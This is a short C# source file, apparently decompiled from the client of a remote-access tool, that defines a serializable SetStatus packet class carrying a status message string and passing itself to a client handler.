using System;

namespace xClient.Core.Packets.ClientPackets;

[Serializable]
public class SetStatus : GInterface4
{
	public string Message { get; set; }

	public SetStatus()
	{
	}

	public SetStatus(string message)
	{
		Message = message;
	}

	public void Execute(GClass33 client)
	{
		client.method_7(this);
	}
}
